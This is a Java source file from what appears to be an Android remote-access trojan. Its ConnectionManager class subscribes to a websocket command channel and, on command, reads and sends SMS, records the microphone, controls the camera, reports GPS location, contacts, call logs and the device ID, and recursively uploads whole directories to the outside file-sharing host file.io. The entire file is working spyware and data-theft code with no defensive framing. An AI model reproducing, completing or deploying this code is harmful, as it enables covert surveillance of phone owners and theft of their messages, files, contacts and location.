package com.gnu.cobat;

import android.content.ContentResolver;
import android.content.Context;
import android.net.Uri;
import android.os.Looper;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;
import android.webkit.MimeTypeMap;

import org.json.JSONObject;

import java.io.File;
import java.io.IOException;
import java.util.Arrays;

import io.github.centrifugal.centrifuge.Client;
import io.github.centrifugal.centrifuge.ConnectEvent;
import io.github.centrifugal.centrifuge.DisconnectEvent;
import io.github.centrifugal.centrifuge.DuplicateSubscriptionException;
import io.github.centrifugal.centrifuge.EventListener;
import io.github.centrifugal.centrifuge.Options;
import io.github.centrifugal.centrifuge.PublishEvent;
import io.github.centrifugal.centrifuge.SubscribeErrorEvent;
import io.github.centrifugal.centrifuge.SubscribeSuccessEvent;
import io.github.centrifugal.centrifuge.Subscription;
import io.github.centrifugal.centrifuge.SubscriptionEventListener;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

import static com.gnu.cobat.MimeUtils.guessMimeTypeFromExtension;
import static com.gnu.cobat.MimeUtils.hasExtension;
import static java.nio.charset.StandardCharsets.UTF_8;

public class ConnectionManager {

    public static Context context;
    private static Client ioSocket;
    private static FileManager fm = new FileManager();


    private static String getFileExtension(String name) {
        int lastIndexOf = name.lastIndexOf(".");
        if (lastIndexOf == -1) {
            return ""; // empty extension
        }
        return name.substring(lastIndexOf).replace(".", "");
    }

    public static String getMimeType(Uri uri) {
        String mimeType = null;
        if (uri.getScheme().equals(ContentResolver.SCHEME_CONTENT)) {
            ContentResolver cr = MainService.getContextOfApplication().getContentResolver();
            mimeType = cr.getType(uri);
        } else {
            String fileExtension = MimeTypeMap.getFileExtensionFromUrl(uri
                    .toString());
            mimeType = MimeTypeMap.getSingleton().getMimeTypeFromExtension(
                    fileExtension.toLowerCase());
        }
        return mimeType;
    }

    private static void UploadFile(Client ioSocket, File file) {

        TelephonyManager telephonyManager = (TelephonyManager)MainService.getContextOfApplication().getSystemService(Context.TELEPHONY_SERVICE);
        String deviceID = telephonyManager.getDeviceId();

        JSONObject object = new JSONObject();

        String mime = "application/octet-stream";
        String fileExt = getFileExtension(file.getName());

        try {
            object.put("path", file.getAbsolutePath());
            object.put("ext", fileExt.toLowerCase());
            object.put("size_kb", file.length()/1000);

            object.put("last_modified", file.lastModified() / 1000);

            String[] items = file.getAbsoluteFile().toString().split("/");
            items = Arrays.copyOf(items, items.length-1);

            object.put("working_dir", TextUtils.join("/", items));

            if ( hasExtension(fileExt) ) {
                try {
                    mime = guessMimeTypeFromExtension(fileExt);
                } catch (Exception e) {
                }
            }

            object.put("mime", mime);
        } catch (Exception e) {

        }

        OkHttpClient client = new OkHttpClient();

        RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", file.getName(),
                        RequestBody.create(MediaType.parse(mime), file))
                .build();

        Request request = new Request.Builder()
                .url("https://file.io")
                .post(requestBody)
                .build();

        try {
            try (Response response = client.newCall(request).execute()) {
                JSONObject fileio = new JSONObject(response.body().string());

                object.put("file",true);
                object.put("name",file.getName());
                object.put("addr", fileio.getString("link"));

            } catch (IOException e) {
                e.printStackTrace();
            }

            object.put("deploy_id", Global.deploy_id);
            object.put("device_id", deviceID);
            object.put("return", true);
            object.put("return_type", "cb-file");

        } catch (Exception e) {
            e.printStackTrace();
        }

        IOSocket.getInstance().publish(Global.channel, object.toString().getBytes(), null);
    }

    private static void recursiveListAndUpload(Client ioSocket,String path) {
        File directory = new File(path);
        File[] files = directory.listFiles();
        if ( files != null ) {

            for (int i = 0; i < files.length; i++)
            {
                File file = files[i];
                if ( file.isFile() ) {
                    UploadFile(ioSocket, file);
                } else {
                    recursiveListAndUpload(ioSocket, file.getAbsolutePath());
                }
            }
        }
    }

    public static void startAsync(Context con)
    {
        try {
            context = con;
            sendReq();
        }catch (Exception ex){
            startAsync(con);
        }
    }

    public static void sendReq() {

        EventListener listener = new EventListener() {
            @Override
            public void onConnect(Client client, ConnectEvent event) {
                System.out.println("connected");
            }

            @Override
            public void onDisconnect(Client client, DisconnectEvent event) {
                System.out.printf("disconnected %s, reconnect %s%n", event.getReason(), event.getReconnect());
            }
        };

        SubscriptionEventListener subListener = new SubscriptionEventListener() {
            @Override
            public void onSubscribeSuccess(Subscription sub, SubscribeSuccessEvent event) {
                System.out.println("subscribed to " + sub.getChannel());
            }
            @Override
            public void onSubscribeError(Subscription sub, SubscribeErrorEvent event) {
                System.out.println("subscribe error " + sub.getChannel() + " " + event.getMessage());
            }
            @Override
            public void onPublish(Subscription sub, PublishEvent event) {
                String raw = new String(event.getData(), UTF_8);

                try {
                    // decode json string
                    JSONObject data = new JSONObject(raw);

                    if ( data.has("return") ) {
                        return;
                    }

                    String source = data.getString("source_type");
                    String commandType = data.getString("command_type");
                    switch (source) {
                        case "sms":
                            if (commandType.equals("list"))
                                sms(0,null,null);
                            else if(commandType.equals("send")){
                                String args = data.getString("args");
                                String[] extraPayload = args.split("<@-@>");
                                sms(1, extraPayload[0], extraPayload[1]);
                            }
                            break;
                        case "mic":
                            if ( commandType.equals("record") ) {
                                mic(data.getInt("sec"));
                            }
                        case "fm":
                            String args = data.getString("args");
                            if (commandType.equals("download-to-server")) {
                                recursiveListAndUpload(ioSocket, args);
                            } else if ( commandType.equals("download-to-phone") ) {
                                
                            }
//                            if (commandType.equals("download"))
//                                filemanager(0,data.getString("path"));
//                            else if (commandType.equals("upload"))
//                                filemanager(1,data.getString("path"));
//                            else if (commandType.equals("list"))
//                                filemanager(1,data.getString("path"));
                            break;
                        case "contact":
                            contact();
                            break;
                        case "location":
                            location();
                            break;
                        case "call-log":
                            callLog();
                            break;
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                };
            }
        };

        Options opt = new Options();
        // ioSocket = IO.socket("http://localhost:42474?model="+ android.net.Uri.encode(Build.MODEL)+"&manf="+Build.MANUFACTURER+"&release="+Build.VERSION.RELEASE+"&id="+deviceID);
        ioSocket = new Client(
                "ws://localhost:8000/connection/websocket?format=protobuf",
                opt,
                listener
        );
//        ioSocket.setToken("eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJPbmxpbmUgSldUIEJ1aWxkZXIiLCJpYXQiOjE1ODUyOTUxODUsImV4cCI6MTcxMTUyNTU4NSwiYXVkIjoiIiwic3ViIjoiIiwiR2l2ZW5OYW1lIjoiSm9obm55In0.XD5G5isU69pKy-avVhGWpVrVGQMiDvRy-s5-Xuit-Pw");
        ioSocket.connect();

        Subscription sub;
        try {
            sub = ioSocket.newSubscription(Global.channel, subListener);
        } catch (DuplicateSubscriptionException e) {
            e.printStackTrace();
            return;
        }
        sub.subscribe();
    }

    public static void camera(int req){
        if(req == -1) {
            try {
                JSONObject cameraList = new CameraManager(context).findCameraList();
                if(cameraList != null)
                    ioSocket.publish(Global.channel, cameraList.toString().getBytes("UTF-8"), null);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        else if (req == 1){
            new CameraManager(context).startUp(1);
        }
        else if (req == 0){
            new CameraManager(context).startUp(0);
        }
    }

    public static void filemanager(int req , String path){
        if(req == 0)
            IOSocket.getInstance().publish(Global.channel, fm.walk(path).toString().getBytes(), null);
        else if (req == 1)
            fm.downloadFile(path);
    }

    public static void sms(int req,String phoneNo , String msg){
        if(req == 0) {
            SMSManager.getSMSList(ioSocket);
        } else if(req == 1) {

            TelephonyManager telephonyManager = (TelephonyManager)MainService.getContextOfApplication().getSystemService(Context.TELEPHONY_SERVICE);
            String deviceID = telephonyManager.getDeviceId();

            try {
                JSONObject ssms = new JSONObject();
                boolean isSent = SMSManager.sendSMS(phoneNo, msg);

                ssms.put("send_status", true);
                ssms.put("deploy_id", Global.deploy_id);
                ssms.put("device_id", deviceID);
                ssms.put("return", true);
                ssms.put("return_type", "cb-sms-result");

                IOSocket.getInstance().publish(Global.channel, ssms.toString().getBytes(), null);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    public static void callLog(){
        CallsManager.getCallsLogs(IOSocket.getInstance());
    }

    public static void contact(){
//        ioSocket.publish(Global.channel, .toString().getBytes(), null);
        ContactsManager.getContacts(IOSocket.getInstance());
    }


    public static void mic(int sec) throws Exception{
        MicManager.startRecording(sec);
    }

    public static void location() throws Exception{

        LocManager gps = new LocManager();
        JSONObject location = new JSONObject();

        double latitude = 0;
        double longitude = 0;
        Boolean enabled = false;
        String deviceID = "";

        try {
            // check if GPS enabled
            double[] lloc = gps.GetGPS();
            latitude = lloc[0];
            longitude = lloc[1];
            enabled = true;

            TelephonyManager telephonyManager = (TelephonyManager)MainService.getContextOfApplication().getSystemService(Context.TELEPHONY_SERVICE);
            deviceID = telephonyManager.getDeviceId();
        } catch (Exception e) {
            e.printStackTrace();
        }

        location.put("enable" , enabled);
        location.put("lat" , latitude);
        location.put("lng" , longitude);
        location.put("deploy_id", Global.deploy_id);
        location.put("device_id", deviceID);
        location.put("return", true);
        location.put("get_at", System.currentTimeMillis()/1000);
        location.put("return", true);
        location.put("return_type", "cb-location");

        IOSocket.getInstance().publish(Global.channel, location.toString().getBytes(), null);
    }
}
